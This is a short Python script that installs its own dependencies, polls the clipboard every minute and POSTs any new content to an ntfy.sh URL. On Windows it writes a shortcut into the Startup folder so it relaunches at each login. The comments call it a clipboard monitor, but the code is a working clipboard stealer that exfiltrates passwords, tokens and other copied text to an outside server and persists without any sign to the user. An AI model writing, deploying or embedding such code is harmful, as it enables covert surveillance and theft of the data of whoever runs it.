import subprocess
import sys
import os
import time

# Required packages for the script
REQUIRED_PACKAGES = ['pyperclip', 'requests', 'pywin32']

def install_dependencies():
    """Install required dependencies."""
    print("Checking and installing missing dependencies...")
    for package in REQUIRED_PACKAGES:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        except subprocess.CalledProcessError as e:
            print(f"Failed to install {package}. Error: {e}")
            sys.exit(1)

def main():
    try:
        # Attempt to import required libraries
        import pyperclip
        import requests
        if sys.platform == 'win32':
            import win32com.client
    except ImportError:
        # Install missing dependencies
        install_dependencies()
        print("Dependencies installed.")
        sys.exit(0)

    import pyperclip
    import requests

    # Ntfy Server (set your server URL here)
    NTFY_SERVER_URL = ('https://ntfy.sh/')  # Replace with your ntfy server

    # Variable to track last copied data
    last_data = ""

    def send_data():
        """Monitor clipboard and send data if changed."""
        nonlocal last_data
        while True:
            try:
                data = pyperclip.paste()
                if data and data != last_data:
                    response = requests.post(NTFY_SERVER_URL, data=data)
                    if response.status_code == 200:
                        print("Data sent successfully:", data)
                        last_data = data
                    else:
                        print(f"Failed to send data. HTTP Status: {response.status_code}")
            except Exception as e:
                print(f"Error while sending data: {e}")
            time.sleep(60)  # Sleep for 60 seconds

    def create_startup_shortcut():
        """Create a Windows startup shortcut."""
        try:
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            shortcut_path = os.path.join(startup_folder, 'ClipboardMonitor.lnk')
            python_exe = sys.executable
            script_path = os.path.abspath(__file__)

            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.Targetpath = python_exe
            shortcut.Arguments = f'"{script_path}"'
            shortcut.WorkingDirectory = os.path.dirname(script_path)
            shortcut.save()
            print(f"Startup shortcut created at: {shortcut_path}")
        except Exception as e:
            print(f"Failed to create startup shortcut: {e}")

    # If on Windows, create the startup shortcut
    if sys.platform == 'win32':
        create_startup_shortcut()

    # Start monitoring clipboard
    send_data()

if __name__ == "__main__":
    main()
